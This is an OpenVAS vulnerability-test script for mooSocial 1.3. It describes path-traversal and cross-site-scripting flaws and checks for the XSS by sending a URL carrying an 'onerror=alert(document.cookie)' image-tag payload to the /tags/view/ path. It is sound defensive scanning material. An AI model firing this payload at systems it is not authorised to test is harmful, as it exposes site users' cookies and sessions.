###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_moosocial_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# mooSocial Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

if(description)
{
  script_id(803840);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-08-26 19:22:05 +0530 (Mon, 26 Aug 2013)");
  script_name("mooSocial Multiple Vulnerabilities");

  tag_summary =
"This host is running mooSocial and is prone to multiple vulnerabilities.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to
read the cookie or not.";

  tag_insight =
"Multiple flaws are due to,
- Input passed via HTTP GET request is used in '$path' variable is not properly
  validating '../'(dot dot) sequences with null byte (%00) at the end.
- Input passed via 'onerror' and 'onmouseover' parameters are not properly
  sanitised before being returned to the user.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML or script
code in a user's browser session and obtain potentially sensitive information
to execute arbitrary local scripts in the context of the webserver.";

  tag_affected =
"mooSocial version 1.3, other versions may also be affected.";

  tag_solution =
"No solution or patch is available as of 28th August, 2013. Information
regarding this issue will be updated once the solution details are available.
For updates refer to http://www.moosocial.com";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://1337day.com/exploit/21160");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/27871");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013080192");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/moosocial-13-cross-site-scripting-local-file-inclusion");
  script_summary("Check if mooSocial is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

foreach dir (make_list("", "/moosocial", "/social", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir,"/"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if('>mooSocial' >< res && 'www.moosocial.com' >< res)
  {
    url = dir + '/tags/view/"><img src="a" onerror="alert(document.cookie)"';

    ## Check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
                       pattern:"alert\(document.cookie\)",
                       extra_check: ">mooSocial"))
    {
      security_hole(port);
      exit(0);
    }
  }
}
